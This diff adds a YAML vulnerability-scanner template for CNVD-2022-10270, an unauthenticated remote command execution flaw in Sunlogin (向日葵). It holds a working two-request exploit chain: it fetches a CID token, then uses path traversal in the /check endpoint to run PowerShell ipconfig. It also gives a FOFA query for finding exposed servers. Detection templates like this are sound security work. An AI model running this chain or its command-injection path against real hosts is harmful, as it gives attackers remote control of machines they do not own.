@@ -1,0 +1,31 @@
+id: CNVD-2022-10270
+
+info:
+  name: 向日葵 check 远程命令执行漏洞
+  author: zan8in
+  severity: critical
+  description: |-
+    向日葵通过发送特定的请求获取CID后，可调用 check接口实现远程命令执行，导致服务器权限被获取
+    fofa: body="Verification failure"
+  reference:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2022-10270
+  tags: cnvd,cnvd2022,unauth,rce,sunflower
+  created: 2022/10/23
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /cgi-bin/rpc?action=verify-haras
+    expression: response.status == 200 && response.body.bcontains(b'"verify_string"')
+    output:
+      search: '"\"verify_string\":\"(?P<cid>.+?)\"".bsubmatch(response.body)'
+      cid: search["cid"]
+  r1:
+    request:
+      method: GET
+      path: /check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+ipconfig
+      headers:
+        Cookie: "CID={{cid}}"
+    expression: response.status == 200 && response.body.bcontains(b'Windows IP')
+expression: r0() && r1()
